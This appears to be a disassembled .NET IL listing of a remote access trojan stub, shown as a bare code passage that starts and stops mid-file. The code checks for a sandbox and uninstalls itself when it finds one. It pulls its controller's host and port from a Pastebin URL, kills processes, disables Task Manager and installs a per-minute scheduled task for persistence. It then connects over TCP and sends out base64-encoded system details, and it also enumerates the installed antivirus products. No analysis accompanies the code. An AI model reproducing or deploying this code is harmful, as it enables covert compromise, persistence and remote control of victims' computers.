    // Code size       121 (0x79)
    .maxstack  3
    .locals init (bool V_0,
             class [mscorlib]System.IO.DirectoryInfo V_1,
             class [mscorlib]System.IO.DirectoryInfo V_2)
    IL_0000:  ldarg.0
    IL_0001:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
    IL_0006:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_000b:  ldarg.1
    IL_000c:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
    IL_0011:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_0016:  ldc.i4.0
    IL_0017:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                      string,
                                                                                                                      bool)
    IL_001c:  brtrue.s   IL_0075

    IL_001e:  ldarg.0
    IL_001f:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.FileInfo::get_Directory()
    IL_0024:  stloc.1
    IL_0025:  ldarg.1
    IL_0026:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.FileInfo::get_Directory()
    IL_002b:  stloc.2
    IL_002c:  ldloc.1
    IL_002d:  callvirt   instance string [mscorlib]System.IO.DirectoryInfo::get_Name()
    IL_0032:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_0037:  ldloc.2
    IL_0038:  callvirt   instance string [mscorlib]System.IO.DirectoryInfo::get_Name()
    IL_003d:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_0042:  ldc.i4.0
    IL_0043:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                      string,
                                                                                                                      bool)
    IL_0048:  brfalse.s  IL_004e

    IL_004a:  ldc.i4.0
    IL_004b:  stloc.0
    IL_004c:  br.s       IL_0077

    IL_004e:  ldloc.1
    IL_004f:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.DirectoryInfo::get_Parent()
    IL_0054:  stloc.1
    IL_0055:  ldloc.2
    IL_0056:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.DirectoryInfo::get_Parent()
    IL_005b:  stloc.2
    IL_005c:  ldloc.1
    IL_005d:  ldnull
    IL_005e:  ceq
    IL_0060:  ldloc.2
    IL_0061:  ldnull
    IL_0062:  ceq
    IL_0064:  and
    IL_0065:  brfalse.s  IL_006b

    IL_0067:  ldc.i4.1
    IL_0068:  stloc.0
    IL_0069:  br.s       IL_0077

    IL_006b:  ldloc.1
    IL_006c:  brtrue.s   IL_0072

    IL_006e:  ldc.i4.0
    IL_006f:  stloc.0
    IL_0070:  br.s       IL_0077

    IL_0072:  ldloc.2
    IL_0073:  brtrue.s   IL_002c

    IL_0075:  ldc.i4.0
    IL_0076:  stloc.0
    IL_0077:  ldloc.0
    IL_0078:  ret
  } // end of method OK::CompDir

  .method public static bool  connect() cil managed noinlining nooptimization
  {
    // Code size       1035 (0x40b)
    .maxstack  5
    .locals init (string[] V_0,
             int32 V_1,
             int32 V_2,
             class [mscorlib]System.Exception V_3,
             object V_4,
             class [mscorlib]System.Exception V_5,
             class [mscorlib]System.Exception V_6,
             class [mscorlib]System.Exception V_7,
             string V_8,
             string V_9,
             class [mscorlib]System.Exception V_10,
             class [mscorlib]System.Exception V_11)
    IL_0000:  ldsfld     bool j.OK::ANYRUN
    IL_0005:  brfalse.s  IL_006c

    IL_0007:  call       string [mscorlib]System.IO.Path::GetTempPath()
    IL_000c:  ldstr      "sand.dat"
    IL_0011:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0016:  call       bool [mscorlib]System.IO.File::Exists(string)
    IL_001b:  brfalse.s  IL_0029

    IL_001d:  ldstr      "127.0.0.1"
    IL_0022:  stsfld     string j.OK::H
    IL_0027:  br.s       IL_003d

    IL_0029:  newobj     instance void Form2::.ctor()
    IL_002e:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.Control::Show()
    IL_0033:  ldc.i4     0x7d0
    IL_0038:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_003d:  call       string [mscorlib]System.IO.Path::GetTempPath()
    IL_0042:  ldstr      "sand.dat"
    IL_0047:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_004c:  call       bool [mscorlib]System.IO.File::Exists(string)
    IL_0051:  brfalse.s  IL_006c

    IL_0053:  ldstr      "127.0.0.1"
    IL_0058:  stsfld     string j.OK::H
    IL_005d:  call       void j.OK::UNS()
    IL_0062:  call       void [System.Windows.Forms]System.Windows.Forms.Application::Exit()
    IL_0067:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_006c:  ldsfld     bool j.OK::PasteE
    IL_0071:  brfalse.s  IL_00b5

    IL_0073:  newobj     instance void [System]System.Net.WebClient::.ctor()
    IL_0078:  ldsfld     string j.OK::PASTEBIN
    IL_007d:  call       instance string [System]System.Net.WebClient::DownloadString(string)
    IL_0082:  ldc.i4.1
    IL_0083:  newarr     [mscorlib]System.Char
    IL_0088:  dup
    IL_0089:  ldc.i4.0
    IL_008a:  ldc.i4.s   58
    IL_008c:  stelem.i2
    IL_008d:  callvirt   instance string[] [mscorlib]System.String::Split(char[])
    IL_0092:  stloc.0
    IL_0093:  ldloc.0
    IL_0094:  ldlen
    IL_0095:  conv.i4
    IL_0096:  ldc.i4.1
    IL_0097:  sub.ovf
    IL_0098:  stloc.2
    IL_0099:  ldc.i4.0
    IL_009a:  stloc.1
    IL_009b:  br.s       IL_00b1

    IL_009d:  ldloc.0
    IL_009e:  ldc.i4.0
    IL_009f:  ldelem.ref
    IL_00a0:  stsfld     string j.OK::H
    IL_00a5:  ldloc.0
    IL_00a6:  ldc.i4.1
    IL_00a7:  ldelem.ref
    IL_00a8:  stsfld     string j.OK::P
    IL_00ad:  ldloc.1
    IL_00ae:  ldc.i4.1
    IL_00af:  add.ovf
    IL_00b0:  stloc.1
    IL_00b1:  ldloc.1
    IL_00b2:  ldloc.2
    IL_00b3:  ble.s      IL_009d

    IL_00b5:  ldc.i4.0
    IL_00b6:  stsfld     bool j.OK::Cn
    IL_00bb:  ldc.i4     0x7d0
    IL_00c0:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_00c5:  ldsfld     bool j.OK::KProc
    IL_00ca:  brfalse.s  IL_00e8

    IL_00cc:  ldstr      "taskkill /f im "
    IL_00d1:  ldsfld     string j.OK::Proc
    IL_00d6:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_00db:  ldc.i4.0
    IL_00dc:  ldc.i4.1
    IL_00dd:  ldc.i4     0x1388
    IL_00e2:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                               valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                               bool,
                                                                                               int32)
    IL_00e7:  pop
    IL_00e8:  ldsfld     bool j.OK::TaskMGR
    IL_00ed:  brfalse.s  IL_00f4

    IL_00ef:  call       void Stub.NoTsk::Start()
    IL_00f4:  ldsfld     bool j.OK::Sched
    IL_00f9:  brfalse    IL_0184

    .try
    {
      IL_00fe:  ldstr      "schtasks /delete /tn \""
      IL_0103:  ldsfld     string j.OK::SCHEDNAME
      IL_0108:  ldstr      "\" /f"
      IL_010d:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0112:  ldc.i4.0
      IL_0113:  ldc.i4.1
      IL_0114:  ldc.i4     0x1388
      IL_0119:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_011e:  pop
      IL_011f:  ldc.i4.5
      IL_0120:  newarr     [mscorlib]System.String
      IL_0125:  dup
      IL_0126:  ldc.i4.0
      IL_0127:  ldstr      "schtasks /create /sc minute /mo 1 /tn \""
      IL_012c:  stelem.ref
      IL_012d:  dup
      IL_012e:  ldc.i4.1
      IL_012f:  ldsfld     string j.OK::SCHEDNAME
      IL_0134:  stelem.ref
      IL_0135:  dup
      IL_0136:  ldc.i4.2
      IL_0137:  ldstr      "\" /tr "
      IL_013c:  stelem.ref
      IL_013d:  dup
      IL_013e:  ldc.i4.3
      IL_013f:  call       class [mscorlib]System.AppDomain [mscorlib]System.AppDomain::get_CurrentDomain()
      IL_0144:  callvirt   instance string [mscorlib]System.AppDomain::get_BaseDirectory()
      IL_0149:  stelem.ref
      IL_014a:  dup
      IL_014b:  ldc.i4.4
      IL_014c:  call       string [System.Windows.Forms]System.Windows.Forms.Application::get_ExecutablePath()
      IL_0151:  call       string [mscorlib]System.IO.Path::GetFileName(string)
      IL_0156:  stelem.ref
      IL_0157:  call       string [mscorlib]System.String::Concat(string[])
      IL_015c:  ldc.i4.0
      IL_015d:  ldc.i4.1
      IL_015e:  ldc.i4     0x1388
      IL_0163:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_0168:  pop
      IL_0169:  leave.s    IL_0184

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_016b:  dup
      IL_016c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0171:  stloc.3
      IL_0172:  ldloc.3
      IL_0173:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0178:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_017d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0182:  leave.s    IL_0184

    }  // end handler
    IL_0184:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
    IL_0189:  stloc.s    V_4
    IL_018b:  ldloc.s    V_4
    IL_018d:  call       void [mscorlib]System.Threading.Monitor::Enter(object)
    .try
    {
      .try
      {
        IL_0192:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_0197:  brfalse.s  IL_01c6

        .try
        {
          IL_0199:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
          IL_019e:  callvirt   instance void [System]System.Net.Sockets.TcpClient::Close()
          IL_01a3:  ldnull
          IL_01a4:  stsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
          IL_01a9:  leave.s    IL_01c6

        }  // end .try
        catch [mscorlib]System.Exception 
        {
          IL_01ab:  dup
          IL_01ac:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_01b1:  stloc.s    V_5
          IL_01b3:  ldloc.s    V_5
          IL_01b5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_01ba:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_01bf:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_01c4:  leave.s    IL_01c6

        }  // end handler
        IL_01c6:  nop
        .try
        {
          IL_01c7:  ldsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
          IL_01cc:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
          IL_01d1:  leave.s    IL_01ee

        }  // end .try
        catch [mscorlib]System.Exception 
        {
          IL_01d3:  dup
          IL_01d4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_01d9:  stloc.s    V_6
          IL_01db:  ldloc.s    V_6
          IL_01dd:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_01e2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_01e7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_01ec:  leave.s    IL_01ee

        }  // end handler
        IL_01ee:  leave.s    IL_020b

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_01f0:  dup
        IL_01f1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_01f6:  stloc.s    V_7
        IL_01f8:  ldloc.s    V_7
        IL_01fa:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_01ff:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0204:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0209:  leave.s    IL_020b

      }  // end handler
      IL_020b:  nop
      .try
      {
        IL_020c:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
        IL_0211:  stsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
        IL_0216:  newobj     instance void [System]System.Net.Sockets.TcpClient::.ctor()
        IL_021b:  stsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_0220:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_0225:  ldc.i4     0x32000
        IL_022a:  callvirt   instance void [System]System.Net.Sockets.TcpClient::set_ReceiveBufferSize(int32)
        IL_022f:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_0234:  ldc.i4     0x32000
        IL_0239:  callvirt   instance void [System]System.Net.Sockets.TcpClient::set_SendBufferSize(int32)
        IL_023e:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_0243:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
        IL_0248:  ldc.i4     0x2710
        IL_024d:  callvirt   instance void [System]System.Net.Sockets.Socket::set_SendTimeout(int32)
        IL_0252:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_0257:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
        IL_025c:  ldc.i4     0x2710
        IL_0261:  callvirt   instance void [System]System.Net.Sockets.Socket::set_ReceiveTimeout(int32)
        IL_0266:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_026b:  ldsfld     string j.OK::H
        IL_0270:  ldsfld     string j.OK::P
        IL_0275:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
        IL_027a:  callvirt   instance void [System]System.Net.Sockets.TcpClient::Connect(string,
                                                                                         int32)
        IL_027f:  ldc.i4.1
        IL_0280:  stsfld     bool j.OK::Cn
        IL_0285:  call       string j.OK::inf()
        IL_028a:  call       bool j.OK::Send(string)
        IL_028f:  pop
        .try
        {
          IL_0290:  ldstr      "vn"
          IL_0295:  ldstr      ""
          IL_029a:  call       object j.OK::GTV(string,
                                                object)
          IL_029f:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
          IL_02a4:  ldstr      ""
          IL_02a9:  ldc.i4.0
          IL_02aa:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConditionalCompareObjectEqual(object,
                                                                                                                                           object,
                                                                                                                                           bool)
          IL_02af:  brfalse.s  IL_02cb

          IL_02b1:  ldloc.s    V_8
          IL_02b3:  ldsflda    string j.OK::VN
          IL_02b8:  call       string j.OK::DEB(string&)
          IL_02bd:  ldstr      "\r\n"
          IL_02c2:  call       string [mscorlib]System.String::Concat(string,
                                                                      string,
                                                                      string)
          IL_02c7:  stloc.s    V_8
          IL_02c9:  br.s       IL_02fb

          IL_02cb:  ldloc.s    V_8
          IL_02cd:  ldstr      "vn"
          IL_02d2:  ldstr      ""
          IL_02d7:  call       object j.OK::GTV(string,
                                                object)
          IL_02dc:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
          IL_02e1:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
          IL_02e6:  stloc.s    V_9
          IL_02e8:  ldloca.s   V_9
          IL_02ea:  call       string j.OK::DEB(string&)
          IL_02ef:  ldstr      "\r\n"
          IL_02f4:  call       string [mscorlib]System.String::Concat(string,
                                                                      string,
                                                                      string)
          IL_02f9:  stloc.s    V_8
          IL_02fb:  ldc.i4.s   16
          IL_02fd:  newarr     [mscorlib]System.String
          IL_0302:  dup
          IL_0303:  ldc.i4.0
          IL_0304:  ldloc.s    V_8
          IL_0306:  stelem.ref
          IL_0307:  dup
          IL_0308:  ldc.i4.1
          IL_0309:  ldsfld     string j.OK::H
          IL_030e:  stelem.ref
          IL_030f:  dup
          IL_0310:  ldc.i4.2
          IL_0311:  ldstr      ":"
          IL_0316:  stelem.ref
          IL_0317:  dup
          IL_0318:  ldc.i4.3
          IL_0319:  ldsfld     string j.OK::P
          IL_031e:  stelem.ref
          IL_031f:  dup
          IL_0320:  ldc.i4.4
          IL_0321:  ldstr      "\r\n"
          IL_0326:  stelem.ref
          IL_0327:  dup
          IL_0328:  ldc.i4.5
          IL_0329:  ldsfld     string j.OK::DR
          IL_032e:  stelem.ref
          IL_032f:  dup
          IL_0330:  ldc.i4.6
          IL_0331:  ldstr      "\r\n"
          IL_0336:  stelem.ref
          IL_0337:  dup
          IL_0338:  ldc.i4.7
          IL_0339:  ldsfld     string j.OK::EXE
          IL_033e:  stelem.ref
          IL_033f:  dup
          IL_0340:  ldc.i4.8
          IL_0341:  ldstr      "\r\n"
          IL_0346:  stelem.ref
          IL_0347:  dup
          IL_0348:  ldc.i4.s   9
          IL_034a:  ldsfld     bool j.OK::Idr
          IL_034f:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(bool)
          IL_0354:  stelem.ref
          IL_0355:  dup
          IL_0356:  ldc.i4.s   10
          IL_0358:  ldstr      "\r\n"
          IL_035d:  stelem.ref
          IL_035e:  dup
          IL_035f:  ldc.i4.s   11
          IL_0361:  ldsfld     bool j.OK::IsF
          IL_0366:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(bool)
          IL_036b:  stelem.ref
          IL_036c:  dup
          IL_036d:  ldc.i4.s   12
          IL_036f:  ldstr      "\r\n"
          IL_0374:  stelem.ref
          IL_0375:  dup
          IL_0376:  ldc.i4.s   13
          IL_0378:  ldsfld     bool j.OK::Isu
          IL_037d:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(bool)
          IL_0382:  stelem.ref
          IL_0383:  dup
          IL_0384:  ldc.i4.s   14
          IL_0386:  ldstr      "\r\n"
          IL_038b:  stelem.ref
          IL_038c:  dup
          IL_038d:  ldc.i4.s   15
          IL_038f:  ldsfld     bool j.OK::BD
          IL_0394:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(bool)
          IL_0399:  stelem.ref
          IL_039a:  call       string [mscorlib]System.String::Concat(string[])
          IL_039f:  stloc.s    V_8
          IL_03a1:  ldstr      "inf"
          IL_03a6:  ldsfld     string j.OK::Y
          IL_03ab:  ldloca.s   V_8
          IL_03ad:  call       string j.OK::ENB(string&)
          IL_03b2:  call       string [mscorlib]System.String::Concat(string,
                                                                      string,
                                                                      string)
          IL_03b7:  call       bool j.OK::Send(string)
          IL_03bc:  pop
          IL_03bd:  leave.s    IL_03da

        }  // end .try
        catch [mscorlib]System.Exception 
        {
          IL_03bf:  dup
          IL_03c0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_03c5:  stloc.s    V_10
          IL_03c7:  ldloc.s    V_10
          IL_03c9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_03ce:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_03d3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_03d8:  leave.s    IL_03da

        }  // end handler
        IL_03da:  leave.s    IL_0405

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_03dc:  dup
        IL_03dd:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_03e2:  stloc.s    V_11
        IL_03e4:  ldloc.s    V_11
        IL_03e6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_03eb:  ldc.i4.0
        IL_03ec:  stsfld     bool j.OK::Cn
        IL_03f1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_03f6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_03fb:  leave.s    IL_0405

      }  // end handler
    }  // end .try
    finally
    {
      IL_03fd:  ldloc.s    V_4
      IL_03ff:  call       void [mscorlib]System.Threading.Monitor::Exit(object)
      IL_0404:  endfinally
    }  // end handler
    IL_0405:  ldsfld     bool j.OK::Cn
    IL_040a:  ret
  } // end of method OK::connect

  .method public static string  DEB(string& s) cil managed
  {
    // Code size       16 (0x10)
    .maxstack  1
    .locals init (uint8[] V_0)
    IL_0000:  ldarg.0
    IL_0001:  ldind.ref
    IL_0002:  call       uint8[] [mscorlib]System.Convert::FromBase64String(string)
    IL_0007:  stloc.0
    IL_0008:  ldloca.s   V_0
    IL_000a:  call       string j.OK::BS(uint8[]&)
    IL_000f:  ret
  } // end of method OK::DEB

  .method public static void  DLV(string n) cil managed
  {
    // Code size       70 (0x46)
    .maxstack  3
    .locals init (class [mscorlib]System.Exception V_0)
    .try
    {
      IL_0000:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_0005:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_000a:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_000f:  ldstr      "Software\\"
      IL_0014:  ldsfld     string j.OK::RG
      IL_0019:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_001e:  ldc.i4.1
      IL_001f:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_0024:  ldarg.0
      IL_0025:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::DeleteValue(string)
      IL_002a:  leave.s    IL_0045

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_002c:  dup
      IL_002d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0032:  stloc.0
      IL_0033:  ldloc.0
      IL_0034:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0039:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_003e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0043:  leave.s    IL_0045

    }  // end handler
    IL_0045:  ret
  } // end of method OK::DLV

  .method public static void  ED() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldc.i4.0
    IL_0001:  call       void j.OK::pr(int32)
    IL_0006:  ret
  } // end of method OK::ED

  .method public static string  ENB(string& s) cil managed
  {
    // Code size       12 (0xc)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       uint8[] j.OK::SB(string&)
    IL_0006:  call       string [mscorlib]System.Convert::ToBase64String(uint8[])
    IL_000b:  ret
  } // end of method OK::ENB

  .method public static pinvokeimpl("user32.dll" nomangle ansi lasterr winapi) 
          native int  GetForegroundWindow() cil managed preservesig
  {
  }
  .method private static pinvokeimpl("kernel32" as "GetVolumeInformationA" nomangle ansi lasterr winapi) 
          int32  GetVolumeInformation(string&  marshal( byvalstr) lpRootPathName,
                                      string&  marshal( byvalstr) lpVolumeNameBuffer,
                                      int32 nVolumeNameSize,
                                      int32& lpVolumeSerialNumber,
                                      int32& lpMaximumComponentLength,
                                      int32& lpFileSystemFlags,
                                      string&  marshal( byvalstr) lpFileSystemNameBuffer,
                                      int32 nFileSystemNameSize) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("user32.dll" as "GetWindowTextA" nomangle ansi lasterr winapi) 
          int32  GetWindowText(native int hWnd,
                               string&  marshal( byvalstr) WinTitle,
                               int32 MaxLength) cil managed preservesig
  {
  }
  .method public static string  GetAntiVirus() cil managed
  {
    // Code size       326 (0x146)
    .maxstack  7
    .locals init (string V_0,
             int32 V_1,
             int32 V_2,
             int32 V_3,
             object V_4,
             object V_5,
             object[] V_6,
             bool[] V_7,
             object V_8,
             class [mscorlib]System.Collections.IEnumerator V_9,
             object V_10,
             int32 V_11,
             class [mscorlib]System.Exception V_12)
    .try
    {
      IL_0000:  ldc.i4.1
      IL_0001:  stloc.3
      IL_0002:  ldstr      "Select * From AntiVirusProduct"
      IL_0007:  stloc.s    V_4
      IL_0009:  ldc.i4.2
      IL_000a:  stloc.3
      IL_000b:  ldstr      "winmgmts:\\\\.\\root\\SecurityCenter2"
      IL_0010:  ldnull
      IL_0011:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::GetObject(string,
                                                                                                      string)
      IL_0016:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_001b:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0020:  stloc.s    V_5
      IL_0022:  ldc.i4.3
      IL_0023:  stloc.3
      IL_0024:  ldc.i4.1
      IL_0025:  newarr     [mscorlib]System.Object
      IL_002a:  dup
      IL_002b:  ldc.i4.0
      IL_002c:  ldloc.s    V_4
      IL_002e:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0033:  stelem.ref
      IL_0034:  stloc.s    V_6
      IL_0036:  ldc.i4.1
      IL_0037:  newarr     [mscorlib]System.Boolean
      IL_003c:  dup
      IL_003d:  ldc.i4.0
      IL_003e:  ldc.i4.1
      IL_003f:  stelem.i1
      IL_0040:  stloc.s    V_7
      IL_0042:  ldloc.s    V_7
      IL_0044:  ldc.i4.0
      IL_0045:  ldelem.u1
      IL_0046:  brfalse.s  IL_0058

      IL_0048:  ldloc.s    V_6
      IL_004a:  ldc.i4.0
      IL_004b:  ldelem.ref
      IL_004c:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0051:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0056:  stloc.s    V_4
      IL_0058:  ldloc.s    V_5
      IL_005a:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_005f:  ldnull
      IL_0060:  ldstr      "ExecQuery"
      IL_0065:  ldloc.s    V_6
      IL_0067:  ldnull
      IL_0068:  ldnull
      IL_0069:  ldloc.s    V_7
      IL_006b:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_0070:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0075:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_007a:  stloc.s    V_8
      IL_007c:  ldc.i4.4
      IL_007d:  stloc.3
      IL_007e:  ldloc.s    V_8
      IL_0080:  castclass  [mscorlib]System.Collections.IEnumerable
      IL_0085:  callvirt   instance class [mscorlib]System.Collections.IEnumerator [mscorlib]System.Collections.IEnumerable::GetEnumerator()
      IL_008a:  stloc.s    V_9
      IL_008c:  br.s       IL_00ca

      IL_008e:  ldloc.s    V_9
      IL_0090:  callvirt   instance object [mscorlib]System.Collections.IEnumerator::get_Current()
      IL_0095:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_009a:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_009f:  stloc.s    V_10
      IL_00a1:  ldc.i4.1
      IL_00a2:  stloc.2
      IL_00a3:  ldc.i4.6
      IL_00a4:  stloc.3
      IL_00a5:  ldloc.s    V_10
      IL_00a7:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_00ac:  ldnull
      IL_00ad:  ldstr      "displayName"
      IL_00b2:  ldc.i4.0
